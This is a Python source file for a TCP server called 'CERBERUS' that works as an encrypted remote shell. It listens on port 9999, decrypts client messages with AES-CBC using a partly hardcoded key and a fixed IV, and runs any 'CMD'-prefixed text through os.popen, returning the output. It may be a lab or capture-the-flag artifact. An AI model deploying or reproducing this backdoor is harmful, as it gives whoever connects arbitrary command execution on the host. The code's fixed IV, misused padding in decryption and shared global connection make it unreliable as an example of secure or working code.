import socket
from threading import Thread
from socketserver import ThreadingMixIn
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from Crypto.Util.Padding import pad, unpad
import os


def decrypt(b64text):
    private_key = bytes(os.environ["App_Encryption_Key"] + "H4cK3d", 'utf-8')
    iv = bytes("1234567890123456", 'utf-8')
    ciphered = b64decode(b64text)
    cipher = AES.new(private_key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(pad(ciphered, AES.block_size))
    return decrypted


class myThread(Thread):
    def __init__(self,ip,port):
        Thread.__init__(self)
        self.ip = ip
        self.port = port
        print ("[+] Someone is connecting to us .... " + ip + ":" + str(port))

    def run(self):
        while True :
            data = con.recv(2048)
            unciphered_data = ""
            try:
                unciphered_data = decrypt(data)


            except:
                attack_file = open("/opt/cerberus/ATTACK_START","w")
                attack_file.write("1")
                attack_file.close()
                con.send(b"WE SAW YOU ! SOLDIERS : LETS FIGHT TO THEIR END !!!!")

            if unciphered_data[0:3] == b"CMD":
                try:
                    print("Launching command : ")
                    command = str(unciphered_data[3:])[2:-1]
                    print(command)
                    result = os.popen(command).read()
                    con.send(bytes(result,'utf-8'))
                except:
                    con.send(bytes('There were a problem with your command my lord' + command ,'utf-8'))


# Programme du serveur TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 9999))
mythreads = []

while True:
    s.listen(5)
    print("Running CERBERUS...")
    (con, (ip,port)) = s.accept()
    mythread = myThread(ip,port)
    mythread.start()
    mythreads.append(mythread)

for t in mythreads:
    t.join()
